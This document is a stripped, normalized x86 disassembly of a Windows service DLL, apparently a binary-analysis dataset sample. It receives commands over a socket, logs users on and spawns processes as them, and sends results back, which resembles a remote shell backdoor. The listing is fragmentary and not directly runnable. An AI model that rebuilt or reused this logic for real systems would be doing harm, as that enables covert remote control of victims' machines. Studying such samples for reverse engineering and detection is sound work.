push eax
push esi
push esi
push 0x10
push 0x1
push esi
push esi
push [ esp + 0x7c ]
mov [ esp + 0x98 ] edi
push esi
mov [ esp + 0xc8 ] 0x101
mov [ esp + 0xcc ] si
mov [ esp + 0xd4 ] ecx
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
push [ rw-data ]
mov esi [ CloseHandle@IAT ]
call esi
push [ rw-data ]
call esi
push 0x5
pop ecx
mov esi r--data
mov edi rw-data
mov eax ebp
[ edi ] [ esi ]
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
mov edi 0x2000
push edi
push 0x0
mov esi rw-data
push esi
call memset
add esp 0xc
push 0x0
push edi
push esi
push [ rw-data ]
call recv
xor edi edi
cmp eax 0x1
mov [ rw-data ] eax
jge r-xdata
push 0x0
lea eax [ esp + 0x1c ]
push eax
xor eax eax
push eax
push rw-data
push sub_71003cb1
push 0x3
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push ebx
push ebp
call sub_71003a63
push eax
push ebx
push [ rw-data ]
mov [ rw-data ] eax
call sub_71002f4a
add esp 0x18
cmp eax 0x1
jl r-xdata
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx esi
add edx 0x2
push edx
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ esp + 0x18 ] eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
mov eax esi
inc ecx
lea edi [ eax + 0x1 ]
mov edx [ esp + 0x18 ]
sub edx esi
mov edi esi
mov [ esp + 0x58 ] edx
jmp r-xdata
lea eax [ esp + 0x1c ]
push eax
push esi
push esi
push sub_71003ad7
push esi
push esi
call [ CreateThread@IAT ]
cmp eax esi
mov [ esp + 0x24 ] eax
jne r-xdata
push [ rw-data ]
mov esi [ CloseHandle@IAT ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push 0x5
pop ecx
mov esi r--data
mov edi rw-data
mov eax ebp
[ edi ] [ esi ]
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
mov esi rw-data
push 0xb
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
lea eax [ esp + 0x1c ]
push eax
xor eax eax
push eax
push rw-data
push sub_71002ded
jmp r-xdata
mov esi rw-data
mov eax esi
lea edi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
cmp ecx eax
jge r-xdata
mov al [ edi ]
cmp al 0x2d
je r-xdata
mov [ rw-data ] 0x1
mov edx rw-data
mov esi r--data
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebp
movsw [ edi ] [ esi ]
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
push 0x5
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push eax
push eax
call [ CreateThread@IAT ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
mov edi [ esp + 0x18 ]
add eax 0x2
push eax
push 0x0
push edi
call memset
mov eax esi
add esp 0xc
lea esi [ eax + 0x1 ]
mov eax esi
lea edx [ eax + 0x1 ]
lea edi [ ecx + 0x1 ]
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x28 ]
mov eax ecx
sub eax [ esp + 0x48 ]
lea edi [ eax + edx - 0x1 ]
mov [ edx + edi ] al
mov eax esi
inc ecx
lea edx [ eax + 0x1 ]
mov [ esp + 0x48 ] ecx
inc edi
mov [ esp + 0x14 ] edx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
push 0x4
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
add eax 0xfffffff8
push eax
push rw-data
push edi
call [ strncpy@IAT ]
add esp 0xc
cmp [ esp + 0x38 ] 0x1
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax [ esp + 0x14 ]
cmp edi eax
jge r-xdata
mov [ edi ] al
mov eax esi
lea edx [ eax + 0x1 ]
inc ecx
inc edi
mov [ esp + 0x14 ] edx
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax [ esp + 0x14 ]
cmp ecx eax
jl r-xdata
push 0x17
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
lea edi [ esp + 0x3f0 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea ecx [ edx + 0x1 ]
push [ esp + 0x18 ]
call sub_71002873
test al al
pop ecx
jne r-xdata
dec edi
mov eax esi
lea edx [ eax + 0x1 ]
lea ecx [ edi + 0x1 ]
mov [ esp + 0x14 ] edx
mov eax edi
sub eax ecx
mov ecx [ esp + 0x2c ]
lea ecx [ eax + ecx - 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax [ esp + 0x14 ]
cmp ecx eax
jl r-xdata
mov edx [ esp + 0x58 ]
push 0x5
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx ecx
add edx 0xffffffea
push edx
lea eax [ esp + 0x3f4 ]
push rw-data
push eax
call memcpy
lea eax [ esp + 0x3fc ]
push eax
call [ _atoi64@IAT ]
mov [ rw-data ] edx
add esp 0x10
mov [ rw-data ] eax
mov edx rw-data
mov ecx [ esp + 0x18 ]
mov ecx [ ecx ]
mov eax r--data
cmp ecx [ eax ]
jne r-xdata
mov esi r--data
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebp
movsb [ edi ] [ esi ]
lea esi [ eax + 0x1 ]
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsw [ edi ] [ esi ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax [ esp + 0x14 ]
cmp ecx eax
jge r-xdata
mov [ ecx ] al
mov eax esi
lea edx [ eax + 0x1 ]
inc edi
inc ecx
mov [ esp + 0x14 ] edx
mov al [ ecx + esi ]
cmp al 0x2d
je r-xdata
push 0x3
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
and [ rw-data ] eax
and [ rw-data ] eax
lea edi [ esp + 0x3c8 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea esi [ edx + 0x1 ]
push [ esp + 0x18 ]
call [ free@IAT ]
pop ecx
jmp r-xdata
push 0x0
push [ esp + 0x28 ]
mov [ rw-data ] 0x0
call [ TerminateThread@IAT ]
and [ esp + 0x24 ] 0x0
mov esi r--data
mov edi rw-data
movsd [ edi ] [ esi ]
mov eax ebp
movsw [ edi ] [ esi ]
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push ebx
push ebp
call sub_71003a63
push eax
push ebx
push [ rw-data ]
mov [ rw-data ] eax
call sub_71002f4a
add esp 0x18
cmp eax 0x1
jl r-xdata
mov edx [ esp + 0x2c ]
mov edx [ edx ]
mov ecx r--data
mov eax ecx
cmp edx [ eax ]
jne r-xdata
mov edx [ esp + 0x3c ]
mov eax ecx
sub eax edi
lea edi [ eax + edx - 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax [ esp + 0x14 ]
cmp edi eax
jl r-xdata
push 0x5
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ rw-data ] 0x1
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx esi
add edx 0xffffffe6
push edx
lea eax [ esp + 0x3cc ]
push rw-data
push eax
call memcpy
lea eax [ esp + 0x3d4 ]
push eax
call [ _atoi64@IAT ]
mov [ rw-data ] edx
add esp 0x10
mov [ rw-data ] eax
mov edx rw-data
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push ebx
push ebp
call sub_71003a63
push eax
push ebx
push [ rw-data ]
mov [ rw-data ] eax
call sub_71002f4a
add esp 0x18
cmp eax 0x1
jl r-xdata
mov eax [ esp + 0x28 ]
mov eax [ eax ]
cmp eax [ ecx ]
jne r-xdata
mov edi [ esp + 0x2c ]
xor eax eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax [ esp + 0x14 ]
cmp ecx eax
jl r-xdata
mov al [ edi + esi ]
cmp al 0x2d
je r-xdata
mov ecx edx
mov cx [ ecx ]
mov eax r--data
cmp cx [ eax ]
jne r-xdata
lea eax [ esp + 0x1c ]
push eax
xor eax eax
push eax
push rw-data
push sub_71004a19
jmp r-xdata
lea eax [ esp + 0x20 ]
push eax
push 0x0
push 0x2
push [ esp + 0x34 ]
push [ esp + 0x3c ]
push [ esp + 0x2c ]
call [ LogonUserA@IAT ]
push [ esp + 0x18 ]
mov edi [ free@IAT ]
mov [ esp + 0x18 ] eax
call edi
push [ esp + 0x2c ]
call edi
push [ esp + 0x34 ]
call edi
push esi
call edi
add esp 0x10
cmp [ esp + 0x14 ] 0x0
jne r-xdata
mov edi [ esp + 0x28 ]
xor eax eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov al [ ecx + esi ]
mov [ edi ] al
mov eax esi
lea edx [ eax + 0x1 ]
inc ecx
inc edi
mov [ esp + 0x14 ] edx
mov ecx edx
mov cx [ ecx ]
mov eax r--data
cmp cx [ eax ]
jne r-xdata
lea eax [ esp + 0x1c ]
push eax
xor eax eax
push eax
push rw-data
push sub_7100441a
jmp r-xdata
lea eax [ esp + 0x3a0 ]
push eax
lea eax [ esp + 0xbc ]
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push [ esp + 0x5c ]
push eax
push [ esp + 0x48 ]
call [ CreateProcessAsUserA@IAT ]
test eax eax
jne r-xdata
mov esi r--data
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebp
movsb [ edi ] [ esi ]
lea esi [ eax + 0x1 ]
push 0x3
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
lea eax [ esp + 0x1c ]
push eax
xor eax eax
push eax
push rw-data
push sub_71004668
jmp r-xdata
mov edx rw-data
mov esi r--data
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebp
movsd [ edi ] [ esi ]
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
push 0x3
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
call sub_7100109e
mov edx ebp
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
push 0x3
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
lea ecx [ esp + 0x40 ]
call sub_7100181c
and [ esp + 0x2690 ] 0x0
lea ecx [ esp + 0x40 ]
call sub_71001891
mov edi 0x2000
push edi
push 0x0
push ebp
call memset
add esp 0xc
lea ecx [ esp + 0x40 ]
call sub_71001c45
mov edx ebp
mov cl [ eax ]
inc eax
mov [ edx ] cl
inc edx
test cl cl
jne r-xdata
mov eax ebp
lea esi [ eax + 0x1 ]
push 0x3
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
push 0x200
push eax
lea eax [ esp + 0x48c ]
push eax
call memset
mov eax rw-data
add esp 0xc
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
mov [ edx ] cl
inc edx
test cl cl
jne r-xdata
mov eax ebp
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
push 0x5
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
and [ esp + 0x20 ] eax
cmp [ esp + 0x30 ] eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
add eax 0xfffffffc
push eax
lea eax [ esp + 0x488 ]
push rw-data
push eax
call memcpy
add esp 0xc
cmp [ esp + 0x38 ] 0x1
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push ebx
push ebp
call sub_71003a63
mov esi eax
push edi
lea eax [ esp + 0x694 ]
push 0x0
push eax
mov [ rw-data ] esi
call memset
push esi
lea eax [ esp + 0x6a0 ]
push ebx
push eax
call memcpy
push edi
push 0x0
push ebp
mov [ esp + 0x44 ] esi
call memset
push esi
push r--data
push ebp
call [ sprintf@IAT ]
mov eax ebp
add esp 0x3c
lea esi [ eax + 0x1 ]
and [ esp + 0x4c ] eax
cmp [ esp + 0x34 ] eax
je r-xdata
lea eax [ esp + 0x1c ]
push eax
xor eax eax
push eax
push rw-data
push sub_7100316c
push eax
push eax
call [ CreateThread@IAT ]
mov [ esp + 0x30 ] eax
jmp r-xdata
lea eax [ esp + 0x20 ]
push eax
push [ esp + 0x34 ]
call [ GetExitCodeThread@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0x50 ]
call sub_7100181c
lea ecx [ esp + 0x50 ]
mov [ esp + 0x2690 ] 0x1
call sub_71001891
lea eax [ esp + 0x484 ]
push eax
call [ atoi@IAT ]
test eax eax
pop ecx
lea ecx [ esp + 0x50 ]
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push ebx
push ebp
call sub_71003a63
add esp 0xc
xor esi esi
push esi
push eax
push ebx
push [ rw-data ]
mov [ rw-data ] eax
call send
cmp eax 0x1
jl r-xdata
lea eax [ esp + 0x1c ]
push eax
xor eax eax
push eax
push rw-data
push sub_71003263
push eax
push eax
call [ CreateThread@IAT ]
mov [ esp + 0x34 ] eax
jmp r-xdata
lea eax [ esp + 0x4c ]
push eax
push [ esp + 0x38 ]
call [ GetExitCodeThread@IAT ]
test eax eax
je r-xdata
push 0x64
call [ Sleep@IAT ]
push 0x6
pop ecx
mov esi r--data
mov edi rw-data
[ edi ] [ esi ]
mov eax ebp
movsw [ edi ] [ esi ]
lea esi [ eax + 0x1 ]
cmp [ esp + 0x20 ] 0x103
je r-xdata
push eax
call sub_71001a44
mov esi eax
lea eax [ esp + 0x484 ]
push eax
call sub_71001b5b
mov esi eax
push esi
push edi
push esi
mov esi rw-data
push esi
call memset
add esp 0xc
push 0x0
push edi
push esi
push [ rw-data ]
call recv
cmp eax 0x1
mov [ rw-data ] eax
jge r-xdata
push 0x7
pop ecx
mov esi r--data
mov edi rw-data
mov eax ebp
[ edi ] [ esi ]
lea esi [ eax + 0x1 ]
cmp [ esp + 0x4c ] 0x103
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
push [ esp + 0x30 ]
call [ CloseHandle@IAT ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi ebp
sub eax esi
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi ebp
sub eax esi
dec edi
or [ esp + 0x2690 ] 0xffffffff
call sub_71001826
jmp r-xdata
push eax
mov esi rw-data
push esi
call sub_71003100
pop ecx
pop ecx
push 0x5
pop ecx
mov edi r--data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
push 0x0
push [ rw-data ]
call shutdown
push [ rw-data ]
call closesocket
push 0x4e20
call [ Sleep@IAT ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
push [ esp + 0x34 ]
call [ CloseHandle@IAT ]
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push 0x13
pop ecx
mov edi r--data
mov esi ebp
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
jmp r-xdata
lea ecx [ esp + 0x40 ]
jmp r-xdata
push [ esp + 0x14 ]
lea eax [ esp + 0x688 ]
push eax
push [ rw-data ]
call sub_71002f4a
add esp 0xc
cmp eax 0x1
jge r-xdata
or [ esp + 0x2690 ] 0xffffffff
call sub_71001826
jmp r-xdata
mov eax ebp
lea esi [ eax + 0x1 ]
and [ esp + 0x24 ] eax
push 0x0
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push ebx
push ebp
call sub_71003a63
push eax
push ebx
push [ rw-data ]
mov [ rw-data ] eax
call sub_71002f4a
add esp 0x18
cmp eax 0x1
jl r-xdata
push [ rw-data ]
call shutdown
push [ rw-data ]
call closesocket
push 0x4e20
call [ Sleep@IAT ]
lea ecx [ esp + 0x40 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call shutdown
push [ rw-data ]
call closesocket
push 0x4e20
call [ Sleep@IAT ]
lea ecx [ esp + 0x50 ]
lea ecx [ esp + 0x50 ]
ServiceMain
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ strncpy@IAT ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi 0x100
push edi
push [ esi ]
lea eax [ ebp - 0x104 ]
push eax
call ebx
push edi
push [ esi ]
mov edi [ wcstombs@IAT ]
lea eax [ ebp - 0x104 ]
push eax
call edi
add esp 0x18
push sub_7100235d
lea eax [ ebp - 0x104 ]
push eax
call [ RegisterServiceCtrlHandlerA@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_71006270
leave
retn 0x8
call [ FreeConsole@IAT ]
push 0x1
push 0x0
push 0x2
call sub_71002315
push 0x0
push 0x0
push 0x4
call sub_71002315
xor eax eax
add esp 0x18
cmp [ ebp + 0x8 ] 0x2
setg al
cmp [ ebp + 0x8 ] 0x1
mov [ ebp - 0x20c ] eax
jle r-xdata
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x208 ]
push eax
lea eax [ ebp - 0x104 ]
push eax
call sub_7100219f
add esp 0xc
test eax eax
jne r-xdata
push 0x104
push [ esi + 0x4 ]
lea eax [ ebp - 0x208 ]
push eax
call ebx
push 0x104
push [ esi + 0x4 ]
lea eax [ ebp - 0x208 ]
push eax
call edi
add esp 0x18
jmp r-xdata
call sub_71004d7b
push 0x104
lea eax [ ebp - 0x208 ]
push r--data
push eax
call ebx
add esp 0xc
cmp eax 0x1
jne r-xdata
push 0xa
call [ Sleep@IAT ]
mov eax [ rw-data ]
cmp eax 0x3
je r-xdata
sub_71006294
push sub_710062ed
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_71006310
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_7100635c
cmp [ rw-data ] 0x0
je sub_71006376
sub esp 0x4
fnstcw [ esp ]
pop eax
and ax 0x7f
cmp ax 0x7f
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
sub_71006376
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_710063f8
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_71006434
push ebx
mov bl [ esp + 0x8 ]
test bl 0x2
push esi
mov esi ecx
je r-xdata
call ?_type_info_dtor_internal_method@type_info@@QAEXXZ
test bl 0x1
je r-xdata
push edi
push ?_type_info_dtor_internal_method@type_info@@QAEXXZ
lea edi [ esi - 0x4 ]
push [ edi ]
push 0xc
push esi
call sub_710069d3
test bl 0x1
je r-xdata
mov eax esi
push esi
call ??3@YAXPAX@Z
pop ecx
mov eax edi
pop edi
jmp r-xdata
push edi
call operator delete
pop ecx
pop esi
pop ebx
retn 0x4
sub_7100648a
push esi
push 0x80
call [ _malloc_crt@IAT ]
mov esi eax
push esi
call [ _encode_pointer@IAT ]
test esi esi
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] eax
jne r-xdata
and [ esi ] 0x0
call sub_71006af3
push sub_71006b17
call sub_71006ae1
mov [ esp ] sub_71006a36
call sub_71006ae1
pop ecx
xor eax eax
pop esi
retn
xor eax eax
inc eax
pop esi
retn
sub_710064d7
mov eax [ esp + 0x8 ]
push ebp
xor ebp ebp
cmp eax ebp
jne r-xdata
cmp eax 0x1
mov ecx [ _adjust_fdiv@IAT ]
mov ecx [ ecx ]
push ebx
push esi
push edi
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] ebp
jle r-xdata
cmp eax ebp
jne r-xdata
mov eax [ fs : 0x18 ]
mov edi [ eax + 0x4 ]
mov ebx [ InterlockedCompareExchange@IAT ]
push ebp
mov esi rw-data
jmp r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
xor eax eax
inc eax
mov edi [ InterlockedCompareExchange@IAT ]
mov esi rw-data
jmp r-xdata
push edi
push esi
call ebx
test eax eax
jne r-xdata
pop ebp
retn 0xc
push ebp
push 0x1
push esi
call edi
test eax eax
jne r-xdata
cmp eax edi
je r-xdata
jmp r-xdata
push 0x3e8
call [ Sleep@IAT ]
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
xor ebp ebp
inc ebp
push 0x3e8
call [ Sleep@IAT ]
push 0x0
mov eax [ rw-data ]
test eax eax
push 0x2
pop edi
je r-xdata
push [ rw-data ]
mov edi [ _decode_pointer@IAT ]
call edi
mov ebx eax
test ebx ebx
pop ecx
je r-xdata
push 0x1f
call _amsg_exit
pop ecx
jmp r-xdata
push r--data
push r--data
mov [ rw-data ] 0x1
call _initterm_e
test eax eax
pop ecx
pop ecx
je r-xdata
push 0x1f
call _amsg_exit
jmp r-xdata
push 0x0
push esi
mov [ rw-data ] ebp
call [ InterlockedExchange@IAT ]
push [ rw-data ]
call edi
pop ecx
mov edi eax
jmp r-xdata
push r--data
push r--data
call _initterm
pop ecx
mov [ rw-data ] edi
xor eax eax
jmp r-xdata
test ebp ebp
pop ecx
jne r-xdata
sub edi 0x4
cmp edi ebx
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push ebp
push esi
call [ InterlockedExchange@IAT ]
pop edi
pop esi
pop ebx
mov eax [ edi ]
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
pop ecx
call [ _encoded_null@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
inc [ rw-data ]
jmp r-xdata
push rw-data
call sub_71006bb2
test eax eax
pop ecx
je r-xdata
call eax
push [ esp + 0x1c ]
push edi
push [ esp + 0x1c ]
call [ rw-data ]
sub_71006676
push 0x10
push r--data
call sub_71006294
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ rw-data ] esi
mov [ ebp - 0x4 ] eax
cmp esi ecx
jne r-xdata
cmp esi eax
je r-xdata
cmp [ rw-data ] ecx
jne r-xdata
mov eax [ r--data ]
cmp eax ecx
je r-xdata
cmp esi 0x2
jne r-xdata
mov [ ebp - 0x1c ] ecx
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_71002189
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
call sub_71006781
mov eax [ ebp - 0x1c ]
call sub_710062d9
retn
push edi
push esi
push ebx
call sub_710064d7
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_710064d7
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_71002189
push edi
push 0x0
push ebx
call sub_710064d7
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
sub_710067ad
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call _crt_debugger_hook
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call _crt_debugger_hook
pop ecx
sub_71006908
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_710068b8
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_71006975
push 0x14
push r--data
call sub_71006294
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
call sub_710062d9
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_71006998
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax ] 0xe06d7363
je r-xdata
